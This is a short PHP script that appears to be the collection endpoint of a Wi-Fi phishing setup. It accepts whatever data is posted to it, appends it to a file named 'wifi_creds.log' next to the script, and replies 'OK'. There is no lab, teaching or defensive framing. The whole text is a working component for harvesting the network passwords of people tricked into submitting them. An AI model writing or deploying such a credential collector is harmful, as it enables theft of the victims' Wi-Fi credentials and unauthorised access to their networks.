<?php
$logFile = __DIR__ . '/wifi_creds.log';

// Get the incoming data
$inputData = file_get_contents('php://input');

// Write to log file with newline
file_put_contents($logFile, $inputData . PHP_EOL, FILE_APPEND | LOCK_EX);

// Send response back
echo "OK";
